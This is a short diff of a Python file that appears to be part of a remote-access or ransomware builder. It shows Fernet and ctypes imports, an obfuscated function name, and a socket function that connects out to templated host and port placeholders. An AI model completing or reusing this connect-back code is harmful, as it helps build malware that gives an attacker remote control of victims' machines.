@@ -17,15 +17,7 @@ from cryptography.fernet import Fernet
 import ctypes
 import sys
 from datetime import datetime
-def readline():
-    filename = "daily_tip.txt"
-    with open(filename) as f:
-        lines = f.readlines()
-        print(random.choice(lines))
-
-
-
-
+import ipaddress
 now = datetime.today()
 dataaa = (datetime.utcnow().strftime('%Y-%m-%d %H-%M-%S-%f')[:-3])
 def Clear():
@@ -391,7 +383,7 @@ def XbNcYPeberQMdl(f_name, path):
 BUFFER_SIZE = 1024
 def connection():
     try:
-        clientHOST = "{clientHOST}"
+        clientHOST = {clientHOST}
         clientPORT = {clientPORT}
         s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((clientHOST, clientPORT))
